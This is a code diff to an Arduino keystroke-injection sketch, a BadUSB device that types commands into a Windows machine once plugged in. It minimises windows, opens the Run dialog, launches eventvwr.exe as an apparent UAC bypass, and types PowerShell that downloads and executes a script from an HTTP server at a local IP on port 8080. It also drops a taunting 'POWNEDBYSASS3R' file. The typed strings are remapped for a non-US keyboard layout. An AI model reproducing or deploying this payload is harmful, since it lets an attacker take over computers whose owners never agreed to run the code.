@@ -3,6 +3,10 @@ void setup(){
   Keyboard.begin();
   delay(10000);
   Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('d');
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
   delay(300);
@@ -118,17 +122,15 @@ void setup(){
   Keyboard.println("start eventvwr.exe");
   Keyboard.println("exit");
   delay(700);
+  Keyboard.print("New/Item /Path C>");
   Keyboard.press(KEY_RIGHT_ALT);
   Keyboard.press('`');
   Keyboard.releaseAll();
   Keyboard.println(" /Name POWNEDBYSASS3R.txt /Value -UAC QUACKED JOJO- /Type file");
   delay(300);
   Keyboard.println("$e)new/object net.webclient");
-  Keyboard.println("iex $e.downloadstring*-http>&&192.168.1.5>8080&W1Nd0WsP0WN3D-(");
+  Keyboard.println("iex $e.downloadstring*-http>&&192.168.1.36>8080&W1Nd0WsP0WN3D-(");
   Keyboard.println("exit");
-
 }
 
-void loop(){
-
-}
+void loop(){}
